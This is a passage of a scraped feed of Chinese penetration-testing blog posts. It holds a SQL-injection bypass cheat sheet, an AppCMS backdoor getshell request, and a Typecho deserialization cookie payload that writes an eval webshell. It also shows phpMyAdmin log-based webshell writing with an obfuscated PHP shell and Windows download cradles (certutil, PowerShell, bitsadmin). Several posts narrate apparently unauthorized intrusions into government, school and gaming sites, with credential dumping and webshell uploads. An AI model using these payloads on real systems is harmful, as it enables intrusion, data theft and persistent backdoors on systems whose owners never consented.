concat_ws()==\u0026gt;group_concat()\nmid()、substr() ==\u0026gt; substring()\n@@user ==\u0026gt; user()\n@@datadir ==\u0026gt; datadir()\n@@version ==\u0026gt; version()\n数字的其他写法绕过空格 1 2 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 注：E0是科学计数法\nconv(,10,36)代替字母 conv(10,10,36)是大写的A lower(conv(10,10,36/16s))小写的a\n常见的bypass id=1+(UnIoN)+(SelECT)+\nid=1+(UnIoN+SeLeCT)+\nid=1+(UnI)(oN)+(SeL)(EcT)\nid=1+’UnI’’On’+’SeL’’ECT’ \u0026lt;-MySQL only\nid=1+’UnI’||’on’+SeLeCT’ \u0026lt;-MSSQL only\n使用count(*) 返回数据行数 1 2 3 4 5 6 select count(*) from users; +----------+ | count(*) | +----------+ | 13 | +----------+ 注意： 这里的行数只是真正的行数，不是最终的id 编号\n报错注入 1.extractvalue 报错\n1 and extractvalue(1, concat(1, (select database() limit 0,1)))--+; 查表 and extractvalue(1, concat(1,(select table_name from information_schema.tables limit 0,1)))–+; 查列 and extractvalue(1, concat(1,(select column_name from information_schema.columns limit 0,1)))–+; 查数据 and extractvalue(1, concat(1,(select password from users limit 0,1)))–+;\n2.UpdateXml报错\n测试语句\n1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) 实际测试过程\n1 2 mysql\u0026gt; select * from article where id = 1 and 1=(updatexml(0x3a,concat(1,(select user())),1)) ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’ 3.运算数值的大小限制报错\n1 2 select exp(~(select*from(select user())a))； ERROR 1690 (22003): DOUBLE value is out of range in \u0026#39;exp(~((select \u0026#39;root@localhost\u0026#39; from dual)))\u0026#39; 这个函数是计算e的n次方，~是按位取补，exp计算的次方数是有限制的，我们如果给他传一个字符串，php 的弱类型就会当成是0这样取反之后就超了，报错\n类似的还有：\n1 select !(select*from(select user())x)-~0; 这里注意一下：\n进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名，一般是as+别名 但是as 可以省略。\n4.floor()\n1 select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 5.geometrycollection()\n1 select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); 6.multipoint()\n1 select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); 7.polygon()\n1 select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); 8.linestring()\n1 select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); 9.multilinestring()\n1 select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); 10.multipolygon()\n1 select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); 限制与from的组合 用 from. 代替 from\n如果遇到表名或者字段名是保留字 这个时候最好使用点号连接表名和字段名，或者直接使用反引号包起来\n在函数名与括号间添加空格或者注释绕过函数过滤 concat/**/()\n在查询时使用一个不存在的函数就能报错出数据库的名字 select password from contents where id=a() 这个a()是不存在的函数，结果如下\n1 2 mysql\u0026gt; select username from users where id=a(); ERROR 1305 (42000): FUNCTION security.a does not exist ","date":"2018-03-14T14:23:34Z","image":"https://w.wallhaven.cc/full/jx/wallhaven-jxd3xw.jpg","permalink":"https://360rce.github.io/p/xb32ls40/","title":"SQL注入常见技巧汇总"},{"content":"在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。\n其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。\n习惯性的一拿到站就查看robots文件。\n简单的看了下服务器的架构，知道是iis7.5的，于是在该文件后尝试解析漏洞。\n没有报错，从经验来看，这页面风格确实是执行php脚本的风格。\n然后在随便找了个图片尝试。\n猜测是该目录没有执行脚本的权限。\n这时候本来想找到个上传点上传张图片马，然后尝试拿shell。\n但此时我有个大胆的想法。将asp以php的方法来执行试试。\n报错了，源码也暴露了出来，然后祭出扫描器扫了一波敏感文件，找到了其配置文件。\n就这样，数据库路径找到了，当我去访问的时候却出现了意外。\n显示404，这尼玛什么鬼。。。\n继续在后面加./php尝试，奇迹又出现了。\n这里用win自带的命令将其下载下来。\ncertutil -urlcache -split -f http://www.xxx.gov.cn/xxx.mdb/.php\n将文件名修改为mdb，然后用破障打开找密码，却发现。。。。里面没密码。\n算了，利用此方法可以看到很多源代码。60个站点50个有狗，玩个锤子，有洞就不错了。这算个高危吧！！！就不继续深入了。\n","date":"2017-12-20T16:27:18Z","image":"https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg","permalink":"https://360rce.github.io/p/mwcslpwe/","title":"一个项目中遇到的奇葩站点"},{"content":"源码 下载地址：http://www.appcms.cc/html/gengxin.html\n官方的更新时间是 2015-8-1\n分析 用beyond compare比较与前一个版本的区别\n可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。\n经过解密，9c224bc6b59179729b15e1dddcbb5c82为字符串kejishidai的md5值。\n由代码知，这里存在一个copy函数构成的后门。\n在第12行，实际执行的即为:\n1 copy(trim($_GET[url]),$_GET[cms]); 将参数url设置为php://input，参数cms设置为shell的文件名，然后POST传入webshell。如下：\n1 2 3 http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai\u0026amp;url=php://input\u0026amp;cms=temp.php POST: \u0026lt;?php phpinfo();?\u0026gt; 接着访问：\nhttp://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php\ngetshell。\n建议 删除 templates/m/ 文件夹下的content_list.php。\n转载自：https://chybeta.github.io，\n","date":"2017-12-18T11:05:05Z","image":"https://w.wallhaven.cc/full/d6/wallhaven-d6d26m.png","permalink":"https://360rce.github.io/p/gxvtssvo/","title":"AppCMS 2.0.101 后门分析"},{"content":"事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。\n我这么菜，还是去看看吧。。。。打开主站\n访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）\n去百度了下看下有啥公开的漏洞吧\n不得不说。。。用的人真的少，这些漏洞都试了下，都没用啊。\n还是看看后台吧，后面加个admin，得到后台之，各种弱口令，都没结果。\n竟然这样，从旁站下手好了。查了下，有这么多\n我一个个找过去……全是这套程序。。我也很无奈啊\n没办法，硬着头皮看了看主站，随便点了个连接貌似伪静态啊。试了半天还是放弃了。\n继续翻其他站，在一个站的首页发现这个。\n尝试下post注入。加个单引号\n好吧 刚准备放弃….过了几秒钟 自动跳转到到了另一个页面\n继续在搜索框那输入了些查询内容点击检索\nSearch后面多了个24，怪我手贱去加个个单引号………报错了（头一次人品爆发）\nAnd 1=1 和and 1=2返回结果\n确定已经存在注入，这次就用手工注入吧。\n先order by猜下字段长度\nhttp://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010 返回正常\nhttp://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011 返回错误\nhttp://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10结果如下\n没有显错位啊，加个and 1=2试试\n显错位替换成database()和version()，版本是5.0以上，有个默认数据库information\nUser(),不是root权限\n接下来查表名\nhttp://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D(这是数据库的hex码，xxx代表马赛克……)\n​ 出来很多啊，用审查元素全部复制下来\nflexi_announcement,flexi_bbcode,flexi_channel,flexi_channel_config,flexi_config,flexi_content,flexi_content_subject,flexi_feedback,flexi_file,flexi_file_watermark,flexi_inquiry,flexi_link,flexi_link_category,flexi_log,flexi_message,flexi_page,flexi_search_cache,flexi_tag,flexi_tag_related,flexi_tpl_block,flexi_user,flexi_user_admin,flexi_u\n起初以为是flexi_user_admin这个表，后来发现帐号密码存在flexi_user这个表中\n接下来查他字段\nhttp://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572\n​ id,name,password,hit_question,hit_answer,email,real_name,gender,birthday,province,address,post_code,phone_code,mphone_code,group_id,reg_time,last_login_time,last_login_ip,login_count,post_count,manager,locked,new_msg_count,memo\n经验判断存放帐号密码的字段是name和password\nhttp://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user\n​ 就这样，帐号密码已经出来了\n利用构造出来的exp:\nindex.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,pass\rword,9,10%20from%20flexi_user\n去主站访问下\n​ 哈哈 帐号密码到手 数了一下是40位…….然后去百度看了看\n​ ………..说是md5的 然后我仔细看了看文章…..屌用都没 我去官网下载了套源码\n查看代码发现是sha1加密\n​ 拿起密码就去cmd5.com解密，悲剧来了………\n​ Oh Fuck\n试了试另外一个，也是一样的结果…..\n​ 然后看了看其他网站，可能真的人品爆发，有个站解密成功了\n然后登录之。\n​ 大概看了看网站后台，在这添加上php\n​ 找到个上传文件的地方，感觉shell就在眼前\n​ 点击上传发现…………我真是个命苦的人啊\n只能拿出我苦练多年的打狗大法…….拿起burp抓包\n在这里构造畸形的http，然后放包，成功上传。（自带滑稽表情）\n点击那个放大镜\n源码暴露了路径也不对劲…….看来不是他真实路径。\n又翻了翻，发现这个，点击检索\n看到刚才上传的文件，点击源文件\n路径变成了，多了个下划线…….\nhttp://www.xxx.com/data/upload/2017-04/08215611_edit._php\n这个问题卡了我两天，各种姿势都试了，还是没办法绕过。\n所以放弃了。。。。。\nPs：这个提供这套cms的站点也存在该漏洞\n","date":"2017-11-03T09:19:25Z","image":"https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg","permalink":"https://360rce.github.io/p/xaef7i9f/","title":"意外性的发现一套cms的注入漏洞"},{"content":"马上就双十一了，发一篇去年双十一写的文章！图片太多，懒得打码了，一年过去了，漏洞没补也不怪我了吧。。。\n事情是这样的，双十一大家都知道，有钱的都在买东西，没钱的都在借钱买东西。像我这种又丑又没钱的只能在聊 QQ……无意间在一个群里看到\n反正无聊，随手打开看看吧。\n看起来是个学校网站啊。说不定有妹子的资料啥的。看到那哥们说有马啥的。我就去打开链接看了看。\n好好好，你赢了，这都是啥屌东西啊~不过还真找到一个 d.asp 的马\n先看看这马能不能溢出吧，毕竟别人的 shell 为啥不能占为己有呢\n………溢出失败，还是别偷懒吧，一步步来。回到首页，随便打开一个链接。\n直觉告诉我，这屌地方有注入啊，加个‘试试。\n果然，报错了…..我也不装逼什么的手工注入了。果断丢进啊 d 神器中，毕竟还要去看片（正经片）。\n出来了，丢到 cmd5 去解密看看\n穷逼买不起….竟然买不起就先找后台吧….找到以后再借钱去买吧….. Admin 404\nLogin.asp 也是 404，算了，用御剑扫扫吧。\n看到前 3 条，有 fck 编辑器。那还是从这下手吧，毕竟能省下解密的钱。 看了下版本，是 2.6.6 的\n2.6.6 版本的 fck 的上传页面\nOk，先来看看第一个\n先查看下目录和文件\n当前目录下什么都没有啊 然后随便上传一张图片看下能否上传吧。\n显示上传没有错误，那就是成功了啊！！！查看下\n果然多出了一张图片，看来会自动重命名了，先访问试试\n可以正常访问的，然后嘛，各种截断都没用\n去查看服务器信息吧…\n那就上解析漏洞吧 创建一个 ice.asp 的文件夹\n我擦，变下划线了\n淡定，我记得这个是可以突破的…. 构造下语句\nFCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder\u0026amp;Type=File\u0026amp;CurrentFolder=/ice.asp\u0026amp;NewFolderName=x.asp\n成功建立了 亮出我们的一句话\n上传成功，查看下文件\n构造下路径访问\n来啊，互相伤害啊\n突然想到，这种站怎么可能会有妹子资料，算了算了，提不起兴趣了。删马走人……. 此文没有任何技术含量。只是双十一屌丝蛋疼打发时间而已！！勿喷\n","date":"2017-11-01T11:18:14Z","image":"https://w.wallhaven.cc/full/l8/wallhaven-l8d8my.png","permalink":"https://360rce.github.io/p/6gkds72h/","title":"毫无技术含量的一次渗透"},{"content":"什么是Typecho？ Typecho 是一款博客程序，它在 GPL version 2 许可证下发行，基于 PHP (需要 PHP5 以上版本)构建,可以运行在各种平台上，支持多种数据库(Mysql, PostgreSQL, SQLite)，在国内使用较广。\n影响的版本 GitHub上2017年10月24日之前的所以版本。\nPayload 1 2 3 4 5 6 7 8 9 10 GET /typecho/install.php?finish=1 HTTP/1.1 Host: 192.168.0.127 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ== Referer:http://192.168.0.127/typecho/install.php Connection: close Upgrade-Insecure-Requests: 1 漏洞复现 我们先去typecho官网下载套源码在本地搭建个环境\n搭建过程就不多说了，自己百度\n搭建好后我们访问首页看看\n接下来我们打开burp设置好代理，访问http://192.168.0.127/typecho/install.php?finish=1 （将ip换成自己的ip），然后把包拦截，将http协议修改成我们的payload。\n然后放包，网站根目录下就生成了一句话马。\n","date":"2017-10-24T14:17:42Z","image":"https://w.wallhaven.cc/full/6d/wallhaven-6dp98l.png","permalink":"https://360rce.github.io/p/r3x4n4vi/","title":"Typecho install.php 反序列化导致任意代码执行"},{"content":"起因 十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。 然后发了我一个app，我安装以后打开一看。 卧槽，XXXX四个大字出现在我眼前 不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去\u0026hellip;..) 祖国的生日结束以后\u0026hellip;..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: http://xxxx.com/。\n踩点 简单的搜集了下信息如下: IP: XXX.XXX.XX.XX 旁站:无 cdn:无 脚本:php 中间件:nginx 框架:ThinkPHP cms:vlcms\n可以判断出服务器架构是:php+mysql+nginx+linux\n进后台 说到这个后台嘛\u0026hellip;\u0026hellip;.很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有\u0026hellip;\u0026hellip;） 在url后面加上admin.php，会跳转到登录界面 测试了下弱口令(人品爆发) admin admin 失败 admin 123456 成功 Getshell 老规矩，知道cms先百度，一样，毛都没\u0026hellip;\u0026hellip; 只能硬着头皮在后台翻了\u0026hellip;.. 这里admin用户权限已经是属于超级管理员了，权限是最高的了。 还有个数据库备份和用户配置 不过数据库是mysql的\u0026hellip;..没屌用啊，此处感慨为啥不学学南方。 剩下的就是上传点了 上传点有点多，随便找了个上传点 先上传张正常的图片看下上传功能是否有用 看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用） 然后各种上传绕过都试了，也是没用。\n高潮 看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能 扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方） 修改url为http://xxxx.com/admin.php?s=/Addons/index，然后访问 和土豆研究了下这个插件，先点击快速创建 点击预览按钮可以看到代码。。。。。 竟然能看到代码？这不是脱裤子找日吗？ 思路：打算在这里写入一句话。 顺手写了个一句话，然后点击预览发现被注释了。 看来是有用的，那就好办了，闭合下注释和php末端。 最后的代码是**/?\u0026gt; \u003c?php @eval($_POST[\"a\"]);?\u003e \u0026lt;?php /* Ok，这样我们的一句话就写进去了。然后点击确定 卧槽，好激动。。。 可是tm的地址呢？？？不过可以肯定的是，马是写进去了。 然后我又创建了一个插件，这次不打算完整闭合代码。 这样肯定是出错的，然后我们点击确定 没错，正如你所见，报错了。刚才创建的名叫test1。 然后构造下我们之前创建名为Example的路径 地址为: http://xxxx.com/Addons/Example/ExampleAddon.class.php 然后请出菜刀，连接看看 连接成功，成功获取shell。 由于服务器Linux服务器我就不去提权了。\n结尾 这种棋牌网站，竟然来了，怎么能不留点东西呢 丢个txt文件走人 ","date":"2017-10-17T14:17:06Z","image":"https://w.wallhaven.cc/full/we/wallhaven-wex6pr.png","permalink":"https://360rce.github.io/p/j5i17p4f/","title":"陪妹子玩游戏引起的风波"},{"content":"事情起因:某个朋友有个phpmyadmin的站拿不下shell。\n拿shell的过程就不多说了，因为是用phpstudy搭建的站点(一般采用集成包搭建的都是system权限)，所以权限挺大的\n首先看了下权限\n确定是system，直接net user添加帐号\n然后加入到管理组\n拒绝访问。。。。查看下是不是有WAF\n确定已经有安全狗了….竟然帐号添加了 但是没办法加入管理组\n这时候y哥对我说直接克隆用户\n然后上传exp\n执行下，显示克隆成功。\n去查看下有没有开放3389\n这里并没有显示3389端口，竟然这样，我们就去查看下他改成什么端口了(不过这里基本上就可以看出端口是3390了…..)\n首先用tasklist /svc查看下服务，找到这个服务对应的PID号\n然后用netstat –ano查看对应的端口\n可以看出端口是3390，然后我们去连接下\n一连接上就自动登录QQ，屎都差点吓出来……….\n以前写的一篇文章，没啥技术含量，此文只是做次笔记\n","date":"2017-09-30T13:19:29Z","image":"https://w.wallhaven.cc/full/9d/wallhaven-9dg8q8.png","permalink":"https://360rce.github.io/p/p1qczh0k/","title":"记一次System权限下的过狗提权"},{"content":"写个文章也算是打发下时间吧！\n一转眼又过去了2年了，想想两年前的自己，浑浑噩噩的混完了高中。\n依稀记得高考前一晚还差点和别人打架，具体原因也是因为那几个要好的朋友。\n虽然现在很少联系，但他们一直都在心中。\n高考的前几天，我们一起在走廊上感概，我们的高中经历了什么，一转眼就没了，也许到现在我们都没法得到答案。\n虽然现在可以吹牛逼说自己高考考了211。别在意，我说的211是分数，不是学校。\n出成绩那天，查完成绩的我仿佛和中彩票一样高兴。\n记得数学是29，这是一个意外的分数，也许是自己隐藏实力太久了吧。\n高中老师都说，大学会很轻松。但愿你不会抱着这种美好的幻想，我会告诉你，都是假的。\n大学给了你疯的时间与机会，却没给你能够陪你一起疯的那群人。\n大学给了我自由恋爱随心所欲的空间和时间，可是我却没有了喜欢的人。\n大学吃饭是一帮人，玩游戏是一帮人，出去玩又是一帮人，而高中这些都是同一帮人。\n关于大学的室友，能忍就忍吧，毕竟要在一起相处三年。\n但是，如果遇到那种大半夜打游戏，还开声音的人，你应该知道怎么做的。\n就像我们宿舍有几个，凌晨4点多还在那打游戏。\n曾经的六人间，变成了现在的二人间。\n一定要上个好大学，真的，好的大学才会让你感受到大学的意义，而辣鸡的大学只是在浪费青春。\n题再难也就高中水平，高考再难顶多也就3天。\n嗯，最后的话。\n喜欢的人能告白还是告白了吧，最起码以后也不遗憾。讨厌的老师该原谅也就原谅了吧，毕竟也是陪你从高三闯出来的人。最好的朋友一定要有完美的告别，要么就保持关系不断。想哭就哭一场吧，这样的日子不多了。校服还是留着吧，这是真正意义上的青春。现在走在大街上，看到穿校服的会很羡慕，感觉那就是青春吧。\n2017届考生，祝好运。\n","date":"2017-06-07T09:32:25Z","image":"https://w.wallhaven.cc/full/o5/wallhaven-o5jx7p.png","permalink":"https://360rce.github.io/p/mf032wl0/","title":"又是一年高考季"},{"content":"mysql中的Into outfile禁用的情况下，我该如何getshell？ 目前into outfile被禁用\n那么我们尝试通过一个脑洞大开的方法去getshell。\n（必须是mysql root权限）\n登录phpmyadmin后，查看全局变量：找到general log和general log file\ngeneral log file是存储了每一个sql语句执行的日志（包含SQL语句本身）\n但是general log变量必须是ON状态，代表启用，然后再去更改\ngeneral log file的地址为我们的webshell，绝对路径。\n在每一次更改general log file的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。\n此时该文件已经创建，并且文件内容保存了最后一条SQL语句的日志信息。\n1 MySQLa, Version: 5.5.53 (MySQL Community Server (GPL)). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 121 Query SHOW GLOBAL VARIABLES WHERE Variable_name=\u0026#34;general_log_file\u0026#34; 121 Quit 接下来，我们直接随意查询SQL，每一句都会被写入这个ice.php\n下面再附上一个SQL查询免杀shell的语句，方便大家遇到此类情况直接利用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 SELECT \u0026#34;\u0026lt;?php $p = array(\u0026#39;f\u0026#39;=\u0026gt;\u0026#39;a\u0026#39;, #afffffffff \u0026#39;pffff\u0026#39;=\u0026gt;\u0026#39;s\u0026#39;/*223* 1*/, \u0026#39;e\u0026#39;=\u0026gt;\u0026#39;fffff\u0026#39;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA\u0026amp;*$@\u0026amp;$@\u0026amp;(#*( \u0026#39;lfaaaa\u0026#39;=\u0026gt;\u0026#39;r\u0026#39;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA\u0026amp;*$@\u0026amp;$@\u0026amp;(#*(; \u0026#39;nnnnn\u0026#39;=\u0026gt;\u0026#39;t\u0026#39;//\u0026amp;$@\u0026amp;(#*(; );//\u0026amp;$@\u0026amp;(#*(; $a = array_keys($p);//9*9*5656 @$_=$p[\u0026#39;pffff\u0026#39;].#/*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/ $p[\u0026#39;pffff\u0026#39;].$a[2]; @$_=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ $p[\u0026#39;f\u0026#39;]./*-/*-*/$_.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ $p[\u0026#39;lfaaaa\u0026#39;].$p[\u0026#39;nnnnn\u0026#39;];#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @$_#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ($_REQUEST[#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ \u0026#39;username\u0026#39;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ]); ?\u0026gt;\u0026#34; 密码username\n","date":"2017-03-17T14:08:45Z","image":"https://w.wallhaven.cc/full/1p/wallhaven-1pg6yw.png","permalink":"https://360rce.github.io/p/84zys99n/","title":"phpmyadmin新姿势getshell"},{"content":"好久没更新博客了 是时候来加快脚步成长了 接下来慢慢 会更新些笔记\nwin 03安装ftp服务 先在我虚拟机里把ftp安装好 win2003的 打开 控制面板-添加或删除程序-添加、删除组件–应用程序服务器（详细信息）–iis信息服务器（详细信息）–ftp 服务\n1.ftp ip：192.168.68.132\n文件：test.txt\n按顺序执行如下代码即可通过ftp来下载文件\ncmd：\n1 2 3 4 5 6 echo open 192.168.68.132 21\u0026gt; ftp.txt echo ftp\u0026gt;\u0026gt; ftp.txt echo bin \u0026gt;\u0026gt; ftp.txt echo ftp\u0026gt;\u0026gt; ftp.txt echo GET test.txt \u0026gt;\u0026gt; ftp.txt ftp -s:ftp.txt 2.vbs vbs downloader,使用msxml2.xmlhttp和adodb.stream对象\n如下代码保存为.vbs文件：\n1 2 3 4 5 6 7 8 9 10 Set Post = CreateObject(\u0026#34;Msxml2.XMLHTTP\u0026#34;) Set Shell = CreateObject(\u0026#34;Wscript.Shell\u0026#34;) Post.Open \u0026#34;GET\u0026#34;,\u0026#34;http://192.168.68.132/test.txt\u0026#34;,0 Post.Send() Set aGet = CreateObject(\u0026#34;ADODB.Stream\u0026#34;) aGet.Mode = 3 aGet.Type = 1 aGet.Open() aGet.Write(Post.responseBody) aGet.SaveToFile \u0026#34;C:\\test\\update\\test.txt\u0026#34;,2 对应到cmd下的命令为：\n1 2 3 4 5 6 7 8 9 10 echo Set Post = CreateObject(\u0026#34;Msxml2.XMLHTTP\u0026#34;) \u0026gt;\u0026gt;download.vbs echo Set Shell = CreateObject(\u0026#34;Wscript.Shell\u0026#34;) \u0026gt;\u0026gt;download.vbs echo Post.Open \u0026#34;GET\u0026#34;,\u0026#34;http://192.168.68.132/test.txt\u0026#34;,0 \u0026gt;\u0026gt;download.vbs echo Post.Send() \u0026gt;\u0026gt;download.vbs echo Set aGet = CreateObject(\u0026#34;ADODB.Stream\u0026#34;) \u0026gt;\u0026gt;download.vbs echo aGet.Mode = 3 \u0026gt;\u0026gt;download.vbs echo aGet.Type = 1 \u0026gt;\u0026gt;download.vbs echo aGet.Open() \u0026gt;\u0026gt;download.vbs echo aGet.Write(Post.responseBody) \u0026gt;\u0026gt;download.vbs echo aGet.SaveToFile \u0026#34;C:\\test\\update\\test.txt\u0026#34;,2 \u0026gt;\u0026gt;download.vbs 3.powershell cmd：\n1 powershell (new-object System.Net.WebClient).DownloadFile(\u0026#39;http://192.168.68.132/test.txt\u0026#39;,\u0026#39;C:\\Users\\isky\\Downloads\\test.txt\u0026#39;) 4.bitsadmin bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带\n使用方法：\ncmd下：\n1 bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\\Users\\isky\\Downloads\\PSTools.zip ","date":"2017-03-14T14:32:19Z","image":"https://w.wallhaven.cc/full/qz/wallhaven-qzmw7q.jpg","permalink":"https://360rce.github.io/p/5uj22xr9/","title":"cmd下几种常见的下载文件的办法"},{"content":"这篇文章，我是怀着无比沉重的心情，在键盘上一个字一个字码出来了。和小Y说好了晚上6点就想写了，一直到晚上的9点，我打开word却迟迟下不了手，那种难受不是在写医学论文时候的思虑和斟酌。也不是因为不知道写些什么，而是，想说的话太多了。 网易云的音乐在随机播放着，直到播放到，现在很火的那部“法医秦明”的网剧的片尾曲“不灭”，我心中拥堵的言语，仿佛有了疏通的管道，一股脑的的涌了出来。这篇文章，我打算以第二人称来写，只为有一天Bge（化名），你可以看的到。\n今天是你进去的第四个月，请原谅我现在才认真的来抒发我的感情。不知道，你到时候还会不会记得当初我们的“大风车”。我也不清楚你具体进去几年，三年或是五年。我知道可能你的前途就此断送了，我恨，我恨那个矮子狗蛋（化名）。我们将来见不到你的日子，都是他一手造成的。\n你是真的傻，当初我们有说过他这个人不简单，早些离开他，不要给他“卖命”。你却一味的认为，跟着他能赚到钱。不知道，当你看到这篇文章，回头在想想他，心中会不会后悔没有听我们的话。但是，用几年的时间去明白一个道理，看透一个人，这样的代价真的太大了。\nLC，你知道，我们有多想你吗。一个花季少年，在他最应该奋斗和打拼的年纪，却失去了自由。不知道你是不是还记得，当初的哪一份悸动。从我在渗透吧第一次看到NPLT（化名）这个ID开始，我就和老大说，这小子还不错呀，我对他挺好奇的，感觉是个会钻研技术的人。后来你担任了小吧，也进入了我们“大风车”。我们通过进一步的了解，渐渐的熟了，你和“大师智”也被我们称为两个死基佬。什么，“大师智”是谁？他就是那个“纠结的坏”呀。你还记得为什么“Bge”的这个称号是这么来的吗？当时我和老大在看一个叫小智的英雄联盟（LOL）解说视频时候，因为小智的视频是他和他的一个叫Bge的好朋友一起双排打的，然后我就在群里发了，“Bge”还有“大师智”这两个称号。“纠结的坏”就说其实他就是大师智，然后你就说“我是Bge呀”。从此，我们都开始改口叫你Bge，叫那个傻逼大师智。\nBge，自从你在网络上没了消息，我们就开始对你进行猜测，没想到当时开玩笑的一句“他不会被查水表，被请去喝茶了吧”，竟然成了真。你空间里的说说被定格在了2016.6.6，还是吃了bsrc送的粽子。我多么希望你能在今时今日发一条说说，呐喊一声“妈的，兄弟们。我回来了”。回忆起以前在一起的时光，我们的交集可能真的不多，交流也是在“大风车”里的扯淡和闲聊，毕竟我的职业和互联网交集太少，渗透或许只是我的兴趣罢了。只是有问题的时候，你都会跟我一通乱扯，我也是一脸懵比，到头来还是老大给我解惑。你说你有什么用，你这渗透吧的小吧当的，群里的秩序也不管管，吧里的垃圾广告帖子也不删一删。还好还有小可爱他们，要不我早就把你的小吧给下了。每每和大师智讨论渗透套路起来，一套一套的，现在大师智都毕业出来，找了一份辣鸡但是很稳定的工作了。我相信要是当时你要是不上了狗蛋这艘贼船，也不会有后来的事情。不过你不用担心，在繁衍下一代的速度上，大师智肯定还是比不上你的，毕竟一个长得和失败试验品似的人，哪有那么快呢，哈哈。\n我不知道当你看到这篇文章的时候是什么样的心情，我早上看到一条消息比较生气。小可爱在我们的“大风车”里发“我这辈子是不可能不日战的，又不会写网站，只能靠日站维持生活，牢里比家里好多了，里面的黑阔们个个都是